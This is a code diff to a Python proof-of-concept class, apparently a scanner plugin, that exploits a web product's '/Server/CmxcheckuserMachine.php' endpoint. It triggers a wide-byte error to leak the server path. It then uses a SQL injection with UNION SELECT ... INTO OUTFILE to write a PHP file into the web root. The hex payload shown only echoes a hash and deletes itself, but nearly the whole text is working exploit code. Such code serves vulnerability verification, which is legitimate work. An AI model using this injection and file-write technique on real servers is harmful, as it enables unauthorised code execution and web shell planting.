@@ -38,8 +38,8 @@ class Poc(ABPoc):
             payload='/Server/CmxcheckuserMachine.php?b=1&a=1'
             url = arg + payload
             code1, head1, res1, errcode1, _url1 = hh.http(url+'%bf')
-            m = re.findall('<b>(.*?)</b>',res1)
-            shell_path = str(os.path.dirname(m[1])) + '\\testvul.php'
+            m = re.findall('<b>(.*?)</b>',res1)[1] if re.findall('<b>(.*?)</b>',res1) else ""
+            shell_path = str(os.path.dirname(m)) + '\\testvul.php'
             shell_path = re.sub(r'\\',r'\\\\',shell_path)
             exp_code = "'%20and%201=2%20union%20select%200x3c3f706870206563686f206d64352831293b756e6c696e6b285f5f46494c455f5f293b3f3e%20into%20outfile%20'{}'%23".format(shell_path)
             code2, head2, res2, errcode2, _url2 = hh.http(url+exp_code)
